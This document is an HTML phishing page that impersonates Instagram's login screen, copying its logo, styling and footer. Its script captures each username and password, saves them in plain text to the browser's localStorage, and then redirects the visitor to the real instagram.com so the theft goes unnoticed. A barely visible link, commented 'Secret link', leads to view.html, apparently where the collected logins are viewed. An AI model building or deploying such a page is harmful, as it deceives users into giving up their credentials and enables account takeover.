<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="manifest" href="manifest.json">
  <meta name="theme-color" content="#ffffff">
  <link rel="icon" href="icon192.png" type="image/png">
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      width: 175px;
    }
    .input-field {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }
    .btn {
      width: 100%;
      background-color: #0095f6;
      color: white;
      border: none;
      padding: 8px;
      margin-top: 10px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #007edb;
    }
    .message {
      margin-top: 15px;
      color: green;
      font-size: 14px;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #8e8e8e;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
  </div>
  <form id="login-form">
    <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" required><br>
    <input type="password" id="password" class="input-field" placeholder="Password" required><br>
    <button type="submit" class="btn">Log In</button>
  </form>
  <div id="message" class="message"></div>

  <!-- Secret link -->
  <div style="margin-top:20px;">
    <a href="view.html" style="font-size:10px; color:#ccc;">.</a> <!-- Hidden link -->
  </div>

</div>

<div class="footer">
  Â© 2025 Instagram
</div>

<script>
document.getElementById('login-form').addEventListener('submit', function(event) {
  event.preventDefault();

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  let savedData = JSON.parse(localStorage.getItem('loginData')) || [];

  savedData.push({ username: username, password: password });

  localStorage.setItem('loginData', JSON.stringify(savedData));

  document.getElementById('message').innerText = "Saved! Redirecting...";
  
  document.getElementById('username').value = "";
  document.getElementById('password').value = "";

  setTimeout(() => {
    window.location.href = "https://instagram.com";
  }, 1500);
});
</script>

</body>
</html>
